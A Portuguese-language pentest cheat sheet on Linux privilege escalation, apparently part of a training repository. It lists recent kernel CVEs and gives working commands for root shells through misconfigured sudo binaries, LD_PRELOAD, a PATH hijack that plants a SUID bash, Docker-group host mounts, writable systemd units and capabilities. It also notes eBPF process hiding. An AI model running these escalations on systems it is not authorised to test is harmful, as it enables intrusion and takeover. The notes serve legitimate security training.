# Linux Privilege Escalation - Atualizacao Moderna

> Complementa `linux_privesc_teoria.md` com CVEs recentes, namespaces, eBPF e cloud-native vectors.

---

## 1. Enumeracao rapida (post-acesso)

```bash
# Tools clasicos
./linpeas.sh -a > /tmp/linpeas.txt
./LinEnum.sh -t

# Modernos / cloud-aware
./pspy64                              # processos sem privilegio
./linux-smart-enumeration.sh -l 2     # foco em escalada
amicontained                          # estamos em container?
```

---

## 2. CVEs recentes para checar (2022-2026)

| CVE | Nome | Versao kernel |
|-----|------|---------------|
| CVE-2022-0847 | DirtyPipe | 5.8 - 5.16.10 |
| CVE-2022-2588 | nf_tables UAF | 5.4 - 5.18 |
| CVE-2023-0386 | OverlayFS escape | < 6.2 |
| CVE-2023-32233 | netfilter UAF | < 6.3.1 |
| CVE-2023-3269 | Stack Rot | 6.1 - 6.4 |
| CVE-2024-1086 | nf_tables double-free | varias |
| CVE-2024-26581 | nft_set_pipapo OOB | varias |
| CVE-2025-21756 | netfilter UAF (recente) | depende |

Sempre cheque `uname -r` e CVE database. Procure PoCs com `searchsploit` ou `pwnkit`-style repos.

---

## 3. Sudo - misconfiguracoes que aparecem em pentest

```bash
sudo -l                              # comecar aqui
sudo -V                              # versao (CVE-2021-3156 Baron Samedit ate 1.9.5p2)
```

### Padroes comuns

- `(ALL) NOPASSWD: /usr/bin/find` -> `sudo find /etc/passwd -exec /bin/sh \; `
- `(ALL) NOPASSWD: /usr/bin/vim` -> `sudo vim -c ':!/bin/sh'`
- `(ALL) NOPASSWD: /usr/bin/awk` -> `sudo awk 'BEGIN {system("/bin/sh")}'`
- `(ALL) NOPASSWD: /usr/bin/less` -> `sudo less /etc/passwd` depois `!sh`
- Catch-all: consulte [GTFOBins](https://gtfobins.github.io/).

### Sudo Env

`Defaults env_keep+="LD_PRELOAD"` -> `sudo LD_PRELOAD=./pwn.so anycommand`.

---

## 4. SUID / SGID modernos

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
getcap -r / 2>/dev/null              # capabilities, mais sutil que SUID
```

Capabilities especialmente sensiveis:

- `cap_setuid+ep` em python/perl/php -> RCE como root.
- `cap_sys_admin+ep` -> mount, namespaces.
- `cap_dac_read_search+ep` -> ler qualquer arquivo.

---

## 5. PATH hijack

```bash
sudo -l
# vê algo como (ALL) NOPASSWD: /usr/local/bin/mybin
file /usr/local/bin/mybin   # se chamar 'ls' sem path absoluto:
echo 'cp /bin/bash /tmp/x; chmod +s /tmp/x' > /tmp/ls
chmod +x /tmp/ls
PATH=/tmp:$PATH sudo /usr/local/bin/mybin
/tmp/x -p   # SUID bash
```

---

## 6. Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
cat /var/spool/cron/crontabs/* 2>/dev/null
systemctl list-timers --all
```

Procurar scripts com permissoes amplas chamados por root.

---

## 7. Process / file caching

```bash
# Conexoes ativas
ss -plant

# Quem mais esta logado
who -a; w; last

# Files abertos por root
lsof -u root 2>/dev/null | grep -v deleted
```

---

## 8. Kernel module loading

```bash
lsmod | head -20
modinfo <module>
```

Se voce tem `CAP_SYS_MODULE` (raro fora de container), pode `insmod` um modulo.

---

## 9. Docker / Podman context

```bash
groups                                # estamos no grupo docker?
ls -la /var/run/docker.sock 2>/dev/null
docker images
```

`docker` group ~= root via `docker run --privileged --pid=host -v /:/host alpine chroot /host`.

---

## 10. Polkit / pkexec (PwnKit CVE-2021-4034)

```bash
pkexec --version          # pre 0.120 -> CVE-2021-4034
```

Ainda aparece em servers nao patchados.

---

## 11. SUID logrotate / Snap / Sudo Baron Samedit

Templates classicos de OSCP/HTB. Sempre vale checar a versao.

```bash
sudo --version
# < 1.9.5p2 -> CVE-2021-3156
```

---

## 12. Cloud / container post-exploitation

- **AWS metadata** dentro de EC2 instance.
- **GCP metadata** com header `Metadata-Flavor: Google`.
- **K8s SA token** em `/var/run/secrets/kubernetes.io/serviceaccount/`.

Consulte modulos [`08-Cloud-RedTeam`](../08-Cloud-RedTeam/) e [`10-Container-Sec`](../10-Container-Sec/).

---

## 13. eBPF post-exploitation (Tier 4)

Atacante com root pode carregar eBPF programs para:
- Esconder processos do `ps`.
- Filtrar pacotes invisivelmente.
- Modificar syscall return values.

Tools: `bpftrace`, custom CO-RE programs.

Mitigation: kernel `kernel.unprivileged_bpf_disabled=2`.

---

## 14. systemd "abuse"

```bash
# Unit files writable?
find /etc/systemd -type f -writable
# Override em /etc/systemd/system/.service permitido?
```

`ExecStart=/bin/sh -c "id > /tmp/x"` em unit que roda como root.

---

## Checklist 5 minutos

- [ ] `id; uname -a; lsb_release -a`
- [ ] `sudo -l`
- [ ] `getcap -r / 2>/dev/null`
- [ ] `find / -perm -u=s -type f 2>/dev/null`
- [ ] cron + timers
- [ ] writable files in `$PATH`
- [ ] grupos perigosos (`docker`, `lxd`, `disk`, `adm`)
- [ ] kernel CVE
- [ ] container/cloud context

---

## Referencias

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [PEASS-ng](https://github.com/peass-ng/PEASS-ng)
